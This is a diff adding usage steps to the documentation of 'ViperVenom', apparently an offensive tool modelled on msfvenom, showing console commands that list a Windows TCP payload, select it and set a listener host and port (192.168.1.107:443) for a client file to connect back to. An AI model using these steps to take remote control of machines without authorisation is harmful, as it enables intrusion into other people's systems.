@@ -78,11 +78,37 @@ Landing/ViperVenom/ > use 1
 After selecting 1, to view available payloads, type
 ```
 show payloads
+
+ViperVenom/ > show payloads
+
+Available Payloads Any Windows:                                                                                                                                                                       
+1 | windows/vipervenom/tcp/payload | Best Option for Windows Exploitation.
+
+```
 ```
 You should brought to the listener page
 ```
 
+To select a payload
+```
+use windows/vipervenom/tcp/payload
 
+/ViperVenom/ > use windows/vipervenom/tcp/payload
+(Listener) Windows/ViperVenom/TCP/Payload > 
+```
+After selecting payload, you must set up your host IP and port that you want to listen to, make sure that your client file has the same host IP and port.
+```
+EXAMPLE:
+
+Listener) Windows/ViperVenom/TCP/Payload > set host 192.168.1.107
+(Listener) Windows/ViperVenom/TCP/Payload > set port 443
+(Listener) Windows/ViperVenom/TCP/Payload > show host
+LHOST=192.168.1.107
+(Listener) Windows/ViperVenom/TCP/Payload > show port
+LPORT=443
+(Listener) Windows/ViperVenom/TCP/Payload > 
+
+```
 
 ## Special Commands
 ```
